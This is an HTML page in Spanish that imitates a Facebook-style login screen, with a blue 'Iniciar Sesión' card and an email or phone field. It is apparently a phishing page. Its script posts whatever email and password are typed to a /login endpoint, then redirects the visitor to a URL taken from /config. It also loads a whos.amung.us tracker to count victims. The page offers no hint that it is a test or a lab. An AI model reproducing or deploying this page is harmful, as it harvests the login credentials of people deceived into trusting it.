<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
        }
        .login-card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { color: #1877f2; font-size: 28px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        button:disabled { background: #8bb4ed; }
        .footer-link { color: #1877f2; text-decoration: none; font-size: 14px; margin-top: 20px; display: block; }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>Iniciar Sesión</h2>
        <input type="text" id="email" placeholder="Correo electrónico o teléfono">
        <input type="password" id="pass" placeholder="Contraseña">
        <button id="btn-login">Entrar</button>
        <a href="#" class="footer-link">¿Olvidaste tu contraseña?</a>
    </div>

    <script>
        // --- LÓGICA DEL CONTADOR PARA LA URL DIRECTA ---
        async function trackSelf() {
            try {
                const res = await fetch('/config');
                const config = await res.json();
                if (config.counter_id) {
                    // Carga el script oficial
                    const s = document.createElement('script');
                    s.async = true;
                    s.src = `https://whos.amung.us/js/chores.js`;
                    document.head.appendChild(s);
                    window.wa_amo = config.counter_id;

                    // Ping de respaldo
                    const img = new Image();
                    img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=Visit&x=${encodeURIComponent(window.location.href)}`;
                }
            } catch (e) { console.error(e); }
        }
        trackSelf();

        // --- LÓGICA DE ENVÍO ---
        document.getElementById('btn-login').onclick = async function() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            if(!email || !pass) return;

            this.disabled = true;
            this.innerText = "Cargando...";

            await fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ email, password: pass })
            });

            const res = await fetch('/config');
            const config = await res.json();
            window.location.href = config.redirect_url;
        };
    </script>
</body>
</html>
